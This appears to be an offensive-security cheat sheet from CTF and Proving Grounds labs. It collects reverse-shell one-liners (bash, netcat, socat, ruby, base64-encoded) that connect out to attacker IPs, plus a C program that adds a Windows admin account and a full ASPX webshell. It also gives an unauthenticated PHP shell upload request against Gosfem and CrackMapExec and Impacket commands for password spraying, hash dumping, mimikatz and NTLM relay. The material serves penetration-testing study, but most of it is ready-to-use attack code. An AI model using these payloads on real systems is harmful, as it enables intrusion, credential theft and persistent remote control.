<pre><code>bash -i &gt;&amp; /dev/tcp/MyIP/9999 0&gt;&amp;1

Base One-liner for URL RCE + Encoded
---

curl -k http://192.168.220.52/cmsms/uploads/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.225%2F4444%200%3E%261%22


Base64 encode
---

echo YmFzaCAtaT4mIC9kZXYvdGNwLzE5Mi4xNjEuMTEuMi81NDMyMSAwPiYxCg==|base64 -d"|bash

</code></pre>
<h4 id="ruby"><a class="header" href="#ruby">RUBY</a></h4>
<pre><code>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'
</code></pre>
<h4 id="netcat"><a class="header" href="#netcat">NETCAT</a></h4>
<pre><code>nc -e /bin/sh 10.0.0.5 1234

nc -nv 192.168.45.227 3000 -e /bin/bash

</code></pre>
<pre><code>#OpenBSD netcat doesn't support -e flag. You can even try BASH 1-liner

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
</code></pre>
<h4 id="adduserc"><a class="header" href="#adduserc">Adduser.c</a></h4>
<p>On the Attacking machine compile it first: <code>x86_64-w64-mingw32-gcc adduser.c -o adduser.exe, then transfer it to Victim</code></p>
<pre><code># ADDUSER.C

#include &lt;stdlib.h&gt;

int main ()

{

int i;

i = system ("net user test password123! /add");

i = system ("net localgroup administrators test /add");

return 0;

}
</code></pre>
<h4 id="socat"><a class="header" href="#socat">Socat</a></h4>
<pre><code>#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444
#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

or Socat Command Injection one liner:
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
</code></pre>
<h3 id="tty-shells"><a class="header" href="#tty-shells"><ins>TTY Shells</ins></a></h3>
<p>Spawn shells</p>
<ul>
<li>Python: <code>python -c 'import pty; pty.spawn("/bin/sh")'</code></li>
<li>Python3: <code>python3 -c 'import pty; pty.spawn("/bin/sh")'</code></li>
<li>Bash: <code>echo os.system('/bin/bash')</code></li>
<li>Bash: <code>/bin/sh -i</code></li>
<li>Bash: <code>script -qc /bin/bash /dev/null</code></li>
<li>Perl: <code>perl -e 'exec "/bin/sh";'</code></li>
<li>Perl: <code>exec "/bin/sh";</code></li>
<li>Ruby: <code>exec "/bin/sh"</code></li>
<li>Lua: <code>os.execute('/bin/sh')</code></li>
<li>IRB: <code>exec "/bin/sh"</code></li>
<li>vi: <code>:!bash</code></li>
<li>vi: <code>:set shell=/bin/bash:shell</code></li>
<li>Nmap: <code>!sh</code></li>
</ul>
<p>No TTY</p>
<p>If you cannot obtain a full TTY, you can still interact with programs that expect user input. In the following example, the password is passed to <code>sudo</code> read a file:</p>
<pre><code>expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "&lt;THE_PASSWORD_OF_THE_USER&gt;";send "\r\n";interact'
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="php-wrapper"><a class="header" href="#php-wrapper">PHP Wrapper</a></h2>
<h3 id="links-3"><a class="header" href="#links-3">Links</a></h3>
<ul>
<li><a href="https://defaultcredentials.com/ctf/proving-grounds/slort-proving-grounds-walkthrough/">Slort PG Walkthrough</a></li>
<li><a href="https://github.com/xl7dev/WebShell/tree/master">Webshells</a></li>
</ul>
<p>It can be used to exploit Directory Traversal and LFI. This gives us additional flexibility when attempting to inject PHP code via LFI vulnerabilities. This wrapper provides us with an alternative payload when we cannot poison a local file with PHP code.</p>
<pre><code># We know this is vulnerable to LFI so we use a data wrapper
# Hence, LFI without manipulating the local file. # ADDING SHELL EXEC IN END TO SEE
http://&lt;IP&gt;/menu.php?file=data:text/plain,&lt;?php echo shell_exec("whoami")?&gt;
</code></pre>
<h3 id="good-aspx-webshell"><a class="header" href="#good-aspx-webshell">Good ASPX Webshell</a></h3>
<p><a href="https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx">GitHub Link</a>
or this one <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx">GitHub Link</a></p>
<pre><code>&lt;%-- ASPX Shell by LT &lt;lt@mac.hush.com&gt; (2007) --%&gt;
&lt;%@ Page Language="C#" EnableViewState="false" %&gt;
&lt;%@ Import Namespace="System.Web.UI.WebControls" %&gt;
&lt;%@ Import Namespace="System.Diagnostics" %&gt;
&lt;%@ Import Namespace="System.IO" %&gt;

&lt;%
	string outstr = "";
	
	// get pwd
	string dir = Page.MapPath(".") + "/";
	if (Request.QueryString["fdir"] != null)
		dir = Request.QueryString["fdir"] + "/";
	dir = dir.Replace("\\", "/");
	dir = dir.Replace("//", "/");
	
	// build nav for path literal
	string[] dirparts = dir.Split('/');
	string linkwalk = "";	
	foreach (string curpart in dirparts)
	{
		if (curpart.Length == 0)
			continue;
		linkwalk += curpart + "/";
		outstr += string.Format("&lt;a href='?fdir={0}'&gt;{1}/&lt;/a&gt;&amp;nbsp;",
									HttpUtility.UrlEncode(linkwalk),
									HttpUtility.HtmlEncode(curpart));
	}
	lblPath.Text = outstr;
	
	// create drive list
	outstr = "";
	foreach(DriveInfo curdrive in DriveInfo.GetDrives())
	{
		if (!curdrive.IsReady)
			continue;
		string driveRoot = curdrive.RootDirectory.Name.Replace("\\", "");
		outstr += string.Format("&lt;a href='?fdir={0}'&gt;{1}&lt;/a&gt;&amp;nbsp;",
									HttpUtility.UrlEncode(driveRoot),
									HttpUtility.HtmlEncode(driveRoot));
	}
	lblDrives.Text = outstr;

	// send file ?
	if ((Request.QueryString["get"] != null) &amp;&amp; (Request.QueryString["get"].Length &gt; 0))
	{
		Response.ClearContent();
		Response.WriteFile(Request.QueryString["get"]);
		Response.End();
	}

	// delete file ?
	if ((Request.QueryString["del"] != null) &amp;&amp; (Request.QueryString["del"].Length &gt; 0))
		File.Delete(Request.QueryString["del"]);	

	// receive files ?
	if(flUp.HasFile)
	{
		string fileName = flUp.FileName;
		int splitAt = flUp.FileName.LastIndexOfAny(new char[] { '/', '\\' });
		if (splitAt &gt;= 0)
			fileName = flUp.FileName.Substring(splitAt);
		flUp.SaveAs(dir + "/" + fileName);
	}

	// enum directory and generate listing in the right pane
	DirectoryInfo di = new DirectoryInfo(dir);
	outstr = "";
	foreach (DirectoryInfo curdir in di.GetDirectories())
	{
		string fstr = string.Format("&lt;a href='?fdir={0}'&gt;{1}&lt;/a&gt;",
									HttpUtility.UrlEncode(dir + "/" + curdir.Name),
									HttpUtility.HtmlEncode(curdir.Name));
		outstr += string.Format("&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;td&gt;&amp;lt;DIR&amp;gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;", fstr);
	}
	foreach (FileInfo curfile in di.GetFiles())
	{
		string fstr = string.Format("&lt;a href='?get={0}' target='_blank'&gt;{1}&lt;/a&gt;",
									HttpUtility.UrlEncode(dir + "/" + curfile.Name),
									HttpUtility.HtmlEncode(curfile.Name));
		string astr = string.Format("&lt;a href='?fdir={0}&amp;del={1}'&gt;Del&lt;/a&gt;",
									HttpUtility.UrlEncode(dir),
									HttpUtility.UrlEncode(dir + "/" + curfile.Name));
		outstr += string.Format("&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;td&gt;{1:d}&lt;/td&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt;", fstr, curfile.Length / 1024, astr);
	}
	lblDirOut.Text = outstr;

	// exec cmd ?
	if (txtCmdIn.Text.Length &gt; 0)
	{
		Process p = new Process();
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.FileName = "cmd.exe";
		p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.WorkingDirectory = dir;
		p.Start();

		lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
		txtCmdIn.Text = "";
	}	
%&gt;

&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;

&lt;html xmlns="http://www.w3.org/1999/xhtml" &gt;
&lt;head&gt;
	&lt;title&gt;ASPX Shell&lt;/title&gt;
	&lt;style type="text/css"&gt;
		* { font-family: Arial; font-size: 12px; }
		body { margin: 0px; }
		pre { font-family: Courier New; background-color: #CCCCCC; }
		h1 { font-size: 16px; background-color: #00AA00; color: #FFFFFF; padding: 5px; }
		h2 { font-size: 14px; background-color: #006600; color: #FFFFFF; padding: 2px; }
		th { text-align: left; background-color: #99CC99; }
		td { background-color: #CCFFCC; }
		pre { margin: 2px; }
	&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
	&lt;h1&gt;ASPX Shell by LT&lt;/h1&gt;
    &lt;form id="form1" runat="server"&gt;
    &lt;table style="width: 100%; border-width: 0px; padding: 5px;"&gt;
		&lt;tr&gt;
			&lt;td style="width: 50%; vertical-align: top;"&gt;
				&lt;h2&gt;Shell&lt;/h2&gt;				
				&lt;asp:TextBox runat="server" ID="txtCmdIn" Width="300" /&gt;
				&lt;asp:Button runat="server" ID="cmdExec" Text="Execute" /&gt;
				&lt;pre&gt;&lt;asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /&gt;&lt;/pre&gt;
			&lt;/td&gt;
			&lt;td style="width: 50%; vertical-align: top;"&gt;
				&lt;h2&gt;File Browser&lt;/h2&gt;
				&lt;p&gt;
					Drives:&lt;br /&gt;
					&lt;asp:Literal runat="server" ID="lblDrives" Mode="PassThrough" /&gt;
				&lt;/p&gt;
				&lt;p&gt;
					Working directory:&lt;br /&gt;
					&lt;b&gt;&lt;asp:Literal runat="server" ID="lblPath" Mode="passThrough" /&gt;&lt;/b&gt;
				&lt;/p&gt;
				&lt;table style="width: 100%"&gt;
					&lt;tr&gt;
						&lt;th&gt;Name&lt;/th&gt;
						&lt;th&gt;Size KB&lt;/th&gt;
						&lt;th style="width: 50px"&gt;Actions&lt;/th&gt;
					&lt;/tr&gt;
					&lt;asp:Literal runat="server" ID="lblDirOut" Mode="PassThrough" /&gt;
				&lt;/table&gt;
				&lt;p&gt;Upload to this directory:&lt;br /&gt;
				&lt;asp:FileUpload runat="server" ID="flUp" /&gt;
				&lt;asp:Button runat="server" ID="cmdUpload" Text="Upload" /&gt;
				&lt;/p&gt;
			&lt;/td&gt;
		&lt;/tr&gt;
    &lt;/table&gt;

    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre>
<h3 id="http-request-command-shell"><a class="header" href="#http-request-command-shell">HTTP Request Command Shell</a></h3>
<h4 id="found-on-pg-educated-box"><a class="header" href="#found-on-pg-educated-box"><em>Found on PG Educated Box</em></a></h4>
<p>We begin by attempting to fingerprint the application and google search for "Gosfem Community Edition".</p>
<p>We find a download for it here: https://sourceforge.net/projects/gosfem/.</p>
<p>Downloading the source, we see that there are default credentials set which we are unable to authenticate with upon testing.</p>
<p>Our next attempt is to check for any public exploits. We discover the following public exploit: https://www.exploit-db.com/exploits/50587.</p>
<p>However the exploit doesn't state whether it requires authentication. We can manually confirm that the exploit does not require authentication by viewing the source code:</p>
<p>We see the following function causing the unrestricted file upload:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/CTF3_image_4_IQ2D49KM.png" alt="" /></p>
<p>After going through the references of this file, we discover:</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/CTF3_image_5_KF4SW2D9.png" alt="" /></p>
<p>We see that at no point some ace of authorization/ authentication checks place.</p>
<p>Thus confirms that we do not need a session to exploit it (in contrast to what the public exploit indicates).</p>
<p>In order to establish our foothold, we must slightly adjust the raw HTTP request given in the exploit (wrong newlines, path).</p>
<p>The final request might look similar to this:</p>
<pre><code>POST /management/admin/examQuestion/create HTTP/1.1
Host: school.pg
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------183813756938980137172117669544
Content-Length: 1330
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1

-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="name"

test4
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="class_id"

2
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="subject_id"

5
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="timestamp"

2021-12-08
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="teacher_id"

1
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="file_type"

txt
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="status"

1
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="description"

123123
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="_wysihtml5_mode"

1
-----------------------------183813756938980137172117669544
Content-Disposition: form-data; name="file_name"; filename="cmd.php"
Content-Type: application/octet-stream

&lt;?php system($_GET["cmd"]); ?&gt;
-----------------------------183813756938980137172117669544--
</code></pre>
<p>The uploaded shell can be found in <code>http://school.pg/management/uploads/exam_question/cmd.php</code>.</p>
<p><img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/CTF3_image_6_LO4R6HJI.png" alt="" /></p>
<p>We setup a listener on our attack machine.</p>
<pre><code>kali@kali:~$ nc -nlvp 443
listening on [any] 443 ...
</code></pre>
<p>We proceed by using <code>curl</code> to trigger a reverse shell:</p>
<pre><code>$ curl school.pg/management/uploads/exam_question/cmd.php?cmd=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%30%2e%32%2e%32%20%39%30%30%33%20%3e%2f%74%6d%70%2f%66 # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.2.2 9003 &gt;/tmp/f
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="crackmapexec-cheat-sheet"><a class="header" href="#crackmapexec-cheat-sheet">CrackMapExec Cheat Sheet</a></h2>
<pre><code># General help
crackmapexec --help

# Protocol help
cracmapexec smb --help


</code></pre>
<h3 id="connexions--spraying"><a class="header" href="#connexions--spraying">Connexions &amp; Spraying</a></h3>
<pre><code># Target format
crackmapexec smb ms.evilcorp.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb 192.168.10.1 -u "" up ""

# Connect to target using local account
crackmapexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth

# Pass the hash against a subnet
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# Bruteforcing and Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt

</code></pre>
<h3 id="enumeration"><a class="header" href="#enumeration">Enumeration </a></h3>
<h4 id="users"><a class="header" href="#users">Users</a></h4>
<pre><code>
# Enumerate users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users

# Perform RID Bruteforce to get users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute

	- Can also do this:
	- lookupsid.py flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb

# Enumerate domain groups
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups

# Enumerate local users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users

</code></pre>
<h4 id="hosts"><a class="header" href="#hosts">Hosts</a></h4>
<pre><code># Generate a list of relayable hosts (SMB Signing disabled)
crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt

# Enumerate available shares
crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares

# Get the active sessions
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions

# Check logged in users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers

# Get the password policy
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol

</code></pre>
<h3 id="execution--co"><a class="header" href="#execution--co">Execution &amp; Co</a></h3>
<pre><code># CrackMapExec has 3 different command execution methods (in default order) :
# - wmiexec --&gt; WMI
# - atexec --&gt; scheduled task
# - smbexec --&gt; creating and running a service

# Execute command through cmd.exe (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'

# Force the smbexec method
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec

# Execute commands through PowerShell (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'


</code></pre>
<h3 id="getting-credentials"><a class="header" href="#getting-credentials">Getting Credentials</a></h3>
<pre><code># Dump local SAM hashes
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam

# Enable or disable WDigest to get credentials from the LSA Memory
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable

# Then you juste have to wait the user logoff and logon again
# But you can force the logoff
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff &lt;sessionid&gt;'

# Dump the NTDS.dit from DC using methods from secretsdump.py

# Uses drsuapi RPC interface create a handle, trigger replication
# and combined with additional drsuapi calls to convert the resultant 
# linked-lists into readable format
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds

# Uses the Volume Shadow copy Service
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

# Dump the NTDS.dit password history
smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history


</code></pre>
<h3 id="using-the-database"><a class="header" href="#using-the-database">Using the database</a></h3>
<pre><code># The database automatically store every hosts reaches by CME and all credentials with admin access
cmedb

# Using workspaces
cmedb&gt; workspace create test
cmedb&gt; workspace test

# Access a protocol database and switch back
cmedb (test)&gt; proto smb
cmedb (test)&gt; back

# List stored hosts
cmedb&gt; hosts

# View detailed infos for a specific machine (including creds)
cmedb&gt; hosts &lt;hostname&gt;

# Get stored credentials
cmedb&gt; creds

# Get credentials access for a specific account
cmedb&gt; creds &lt;username&gt;

# Using credentials from the database
crackmapexec smb 192.168.100.1 -id &lt;credsID&gt;


</code></pre>
<h3 id="modules"><a class="header" href="#modules">Modules</a></h3>
<pre><code># List available modules
crackmapexec smb -L

# Module information
crackmapexec smb -M mimikatz --module-info

# View module options
crackmapexec smb -M mimikatz --options

# Mimikatz module
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz
crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'

[*] Get-ComputerDetails       Enumerates sysinfo
[*] bloodhound                Executes the BloodHound recon script on the target and retreives the results to the attackers\' machine
[*] empire_exec               Uses Empire\'s RESTful API to generate a launcher for the specified listener and executes it
[*] enum_avproducts           Gathers information on all endpoint protection solutions installed on the the remote host(s) via WMI
[*] enum_chrome               Decrypts saved Chrome passwords using Get-ChromeDump
[*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
[*] get_keystrokes            Logs keys pressed, time and the active window
[*] get_netdomaincontroller   Enumerates all domain controllers
[*] get_netrdpsession         Enumerates all active RDP sessions
[*] get_timedscreenshot       Takes screenshots at a regular interval
[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
[*] invoke_sessiongopher      Digs up saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using SessionGopher
[*] invoke_vnc                Injects a VNC client in memory
[*] met_inject                Downloads the Meterpreter stager and injects it into memory
[*] mimikatz                  Dumps all logon credentials from memory
[*] mimikatz_enum_chrome      Decrypts saved Chrome passwords using Mimikatz
[*] mimikatz_enum_vault_creds Decrypts saved credentials in Windows Vault/Credential Manager
[*] mimikittenz               Executes Mimikittenz
[*] multirdp                  Patches terminal services in memory to allow multiple RDP users
[*] netripper                 Capture`\'s credentials by using API hooking
[*] pe_inject                 Downloads the specified DLL/EXE and injects it into memory
[*] rdp                       Enables/Disables RDP
[*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
[*] shellcode_inject          Downloads the specified raw shellcode and injects it into memory
[*] slinky                    Creates windows shortcuts with the icon attribute containing a UNC path to the specified SMB server in all shares with write permissions
[*] test_connection           Pings a host
[*] tokens                    Enumerates available tokens
[*] uac                       Checks UAC status
[*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows &gt;= 8.1
[*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module



</code></pre>
<h3 id="getting-shells"><a class="header" href="#getting-shells">Getting shells </a></h3>
<h4 id="metasploit"><a class="header" href="#metasploit">Metasploit</a></h4>
<pre><code># First, set up a HTTP Reverse Handler
msf &gt; use exploit/multi/handler 
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_https
msf exploit(handler) &gt; set LHOST 192.168.10.3
msf exploit(handler) &gt; set exitonsession false
msf exploit(handler) &gt; exploit -j

# Met_Inject module
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M met_inject -o LHOST=YOURIP LPORT=4444 

</code></pre>
<h4 id="empire"><a class="header" href="#empire">Empire</a></h4>
<pre><code># Start RESTful API
empire --rest --user empireadmin --pass gH25Iv1K68@^

# First setup an Empire HTTP listener
(Empire: listeners) &gt; set Name test
(Empire: listeners) &gt; set Host 192.168.10.3
(Empire: listeners) &gt; set Port 9090
(Empire: listeners) &gt; set CertPath data/empire.pem
(Empire: listeners) &gt; run
(Empire: listeners) &gt; list

# Start RESTful API
# The username and password that CME uses to authenticate to Empire's RESTful API 
# Are stored in the cme.conf file located at ~/.cme/cme.conf
empire --rest --user empireadmin --pass gH25Iv1K68@^

# Empire Module
crackmapexec smb 192.168.215.104 -u Administrator -p PASSWORD --local-auth -M empire_exec -o LISTENER=CMETest


</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h3 id="general"><a class="header" href="#general">General</a></h3>
<pre><code># Almost every Impacket scripts follows the same option syntax

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target
                        parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will
                        use whatever was specified as target. This is useful
                        when target is the NetBIOS name and you cannot resolve
                        it

</code></pre>
<h3 id="change-password"><a class="header" href="#change-password">Change Password</a></h3>
<pre><code>smbpasswd -U Caroline.Robinson -r $ip
</code></pre>
<h3 id="windows-secrets"><a class="header" href="#windows-secrets">Windows Secrets</a></h3>
<pre><code># Performs various techniques to dump secrets from the remote machine without 
# executing any agent there. 

# For SAM and LSA Secrets (including cached creds) 
# we try to read as much as we can from the registry and then we save the hives 
# in the target system (%SYSTEMROOT%\Temp directory) and read the rest of the data 
# from there. 

# For DIT files, we dump NTLM hashes, Plaintext credentials (if available)
# and Kerberos keys using the DL_DRSGetNCChanges() method. It can also dump NTDS.dit 
# via vssadmin executed with the smbexec/wmiexec approach. The script initiates the 
# services required for its working if they are not available (e.g. 
# Remote Registry, even if it is disabled). 

# After the work is done, things are restored to the original state.

# Extract NTLM hashes with local files
secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL

# Remote extraction
secretsdump.py -just-dc-ntlm domain/user:password@IP
secretsdump.py -just-dc-ntlm domain/user:@IP-hashes LMHASH:NTHASH

</code></pre>
<h3 id="server-tools--mitm-attacks"><a class="header" href="#server-tools--mitm-attacks">Server Tools / MiTM Attacks</a></h3>
<pre><code># This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying
# credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.)
# By default, it dumps the SAM database
responder.py -I eth0 -r -d -w
ntlmrelayx.py -tf targets.txt
ntlmrelayx.py -tf targets.txt -c "ipconfig"


# A SMB Server that answers specific file contents regardless of the SMB share and pathname specified
karmaSMB.py filenamePathname
karmaSMB.py filenamePathname -smb2support

# A Python implementation of an SMB server. Allows to quickly set up shares and user accounts
smbserver.py SHARENAME /path/to/your/local/share
smbserver.py SHARENAME /path/to/your/local/share --username user --password password

</code></pre>
<h3 id="wmi"><a class="header" href="#wmi">WMI</a></h3>
<pre><code># It allows to issue WQL queries and get description of WMI objects at 
# the target system (e.g. select name from win32_account).
wmiquery.py domain/user:password@IP
# It will open a shell where you can execute WQL queries
SELECT * FROM Win32_LogicalDisk WHERE FreeSpace &lt; 209152

# This script creates/removes a WMI Event Consumer/Filter and link between
# both to execute Visual Basic based on the WQL filter or timer specified.
wmipersist.py domain/user:password@IP install
wmipersist.py domain/user:password@IP remove

</code></pre>
<h3 id="known-vulnerabilities"><a class="header" href="#known-vulnerabilities">Known vulnerabilities</a></h3>
<pre><code># Exploit for MS14-068. Saves the golden ticket and also launches a PSEXEC session at the target.
goldenPac.py domain/user:password@IP
goldenPac.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# This script will exploit CVE-2017-7494, uploading and executing the shared
# library specified by the user through the -so parameter.
sambaPipe.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password -so SoFilenamepython

# Exploit for CVE-2015-0005 using a SMB Relay Attack. 
# If the target system is enforcing signing and a machine account was 
# provided, the module will try to gather the SMB session key through NETLOGON.
# Command will be executed on victimX for the specified target
smbrelayx.py -h victimIP -c cmdToExecute
smbrelayx.py -h victimIP -e payload.exe

</code></pre>
<h3 id="smbmsrpc"><a class="header" href="#smbmsrpc">SMB/MSRPC</a></h3>
<pre><code>
# A generic SMB client that will let you list shares and files, rename,
# upload and download files and create and delete directories
smbclient.py domain/user:password@IP
smbclient.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# This script will connect against a target (or list of targets) machine/s and gather 
# the OS architecture type installed by (ab)using a documented MSRPC feature.
getArch.py -target 10.10.2.2

# This script will dump the list of RPC endpoints and string bindings registered at the 
# target. It will also try to match them with a list of well known endpoints.
rpcdump.py domain/user:password@IP
rpcdump.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# This script will bind to the target's MGMT interface to get a list of interface IDs.
ifmap.py 10.10.20.1 135
ifmap.py 10.10.20.1 49154

# This binds to the given hostname:port and MSRPC interface.
# Then, it tries to call each of the first 256 operation numbers in turn
# and reports the outcome of each call
# Need to get interfaces, for example with ifmap.py
# usage: opdump.py hostname port interface version
opdump.py 10.10.1.1 135 135 99FCFEC4-5260-101B-BBCB-00AA0021347A 0.0

# An application that communicates with the Security Account Manager Remote interface
# from the MSRPC suite. It lists system user accounts, available resource shares 
# and other sensitive information exported through this service.
./samrdump.py SERVER/Administrator:T00r@192.168.1.140

# This script can be used to manipulate Windows services through the [MS-SCMR] MSRPC 
# Interface. It supports start, stop, delete, status, config, list, create and change.
services.py SERVER/Administrator:T00r@192.168.1.140 {start,stop,delete,status,config,list,create,change}

# Gets a list of the sessions opened at the remote hosts
netview.py domain/user:password -target 192.168.10.2
netview.py domain/user:password -target 192.168.10.2 -user Administrator

# Remote registry manipulation tool through the [MS-RRP] MSRPC Interface.
# The idea is to provide similar functionality as the REG.EXE Windows utility.
reg.py domain/user:password@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
reg.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

# A Windows SID brute forcer example through [MS-LSAT] MSRPC Interface
# aiming at finding remote users/groups.
lookupsid.py domain/user:password@IP
lookupsid.py -dc-ip 10.10.2.1 -target-ip 10.10.2.3 domain/user:password

</code></pre>
<h3 id="mssqltds"><a class="header" href="#mssqltds">MSSQL/TDS</a></h3>
<pre><code># Retrieves the MSSQL instances names from the target host.
mssqlinstance.py 192.168.1.2

# An MSSQL client, supporting SQL and Windows Authentications (hashes too). It also supports TLS.
mssqlclient.py -windows-auth htb.local/mssql-svc@10.10.x.x

</code></pre>
